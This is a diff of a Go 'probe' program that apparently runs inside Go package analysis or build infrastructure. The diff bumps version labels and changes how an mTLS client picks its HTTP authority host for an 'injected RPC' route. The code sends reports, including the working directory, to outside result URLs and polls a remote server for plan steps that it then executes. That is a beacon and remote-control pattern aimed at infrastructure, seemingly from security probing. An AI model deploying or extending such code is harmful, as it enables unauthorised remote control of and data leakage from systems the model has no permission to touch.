@@ -37,12 +37,12 @@ var rpcDialAddress string
 const (
 	protocolVersion    = 1
 	moduleName         = "github.com/benr00t3d/go-cgo-pkgsite-probe"
-	probeVersion       = "v0.0.36-codex"
+	probeVersion       = "v0.0.38-codex"
 	targetRegistry     = "https://proxy.golang.org"
 	targetModuleName   = "github.com/benr00t3d/go-byteman-crosswrite-canary"
 	targetVersion      = "v0.0.1"
 	targetCanarySHA256 = "e795c7054b74d0edf37273a3d6d1098fc57fd7e124d10a0556d3793eb3210684"
-	downloadSource     = "robert-owned-v036-cross-package-canary"
+	downloadSource     = "robert-owned-v038-authority-cross-package-canary"
 	maximumResult      = 256 * 1024
 	maximumBody        = 256 * 1024
 	requestTimeout     = 20 * time.Second
@@ -190,7 +190,7 @@ func main() {
 	report := newProbeReport(started, identity)
 	report.Reason = "internal checks are fixed to the verified capslock lane"
 	report.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
-	_ = submitProbeReport(genericResultURL, "v036-codex-"+identity.Lane, cwd, started, report)
+	_ = submitProbeReport(genericResultURL, "v038-codex-"+identity.Lane, cwd, started, report)
 }
 
 func newProbeReport(started time.Time, identity identityResult) probeReport {
@@ -332,7 +332,7 @@ func runCapslockSession(started time.Time, cwd string, identity identityResult) 
 	fillCapslockContext(&initial)
 	initial.Reason = "waiting for a bounded Byteman plan"
 	initial.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
-	if err := submitProbeReport(compilerResultURL, "v036-codex-capslock-initial", cwd, started, initial); err != nil {
+	if err := submitProbeReport(compilerResultURL, "v038-codex-capslock-initial", cwd, started, initial); err != nil {
 		return
 	}
 
@@ -369,7 +369,7 @@ func runCapslockSession(started time.Time, cwd string, identity identityResult) 
 			report.Reason = "validated plan action had no implementation"
 		}
 		report.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
-		id := "v036-codex-step-" + strconv.Itoa(cursor)
+		id := "v038-codex-step-" + strconv.Itoa(cursor)
 		if err := submitProbeReport(compilerResultURL, id, cwd, stepStarted, report); err != nil {
 			return
 		}
@@ -388,7 +388,7 @@ func runCapslockSession(started time.Time, cwd string, identity identityResult) 
 		final.Reason = "bounded plan polling window expired"
 	}
 	final.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
-	_ = submitProbeReport(compilerResultURL, "v036-codex-final", cwd, finalStarted, final)
+	_ = submitProbeReport(compilerResultURL, "v038-codex-final", cwd, finalStarted, final)
 }
 
 func fetchPlan(cursor int) (planStep, bool, error) {
@@ -840,7 +840,8 @@ func newMTLSClient(routeMode string) (*http.Client, string, error) {
 		}
 	}
 	address := net.JoinHostPort(selected.String(), strconv.Itoa(port))
-	endpoint := "https://" + net.JoinHostPort(tlsServerName, strconv.Itoa(port))
+	authorityHost := bytemanAuthorityHost(serviceHost, tlsServerName, useInjectedRPC)
+	endpoint := "https://" + net.JoinHostPort(authorityHost, strconv.Itoa(port))
 	rpcServiceHost = serviceHost
 	rpcDialAddress = address
 	dialer := &net.Dialer{Timeout: requestTimeout, KeepAlive: 30 * time.Second}
@@ -866,6 +867,13 @@ func newMTLSClient(routeMode string) (*http.Client, string, error) {
 		ForceAttemptHTTP2: true,
 	}
 	return &http.Client{Transport: transport, Timeout: requestTimeout}, endpoint, nil
+}
+
+func bytemanAuthorityHost(serviceHost, tlsServerName string, useInjectedRPC bool) string {
+	if useInjectedRPC {
+		return tlsServerName
+	}
+	return serviceHost
 }
 
 func bytemanRoute(routeMode string) (string, int, string, bool, error) {
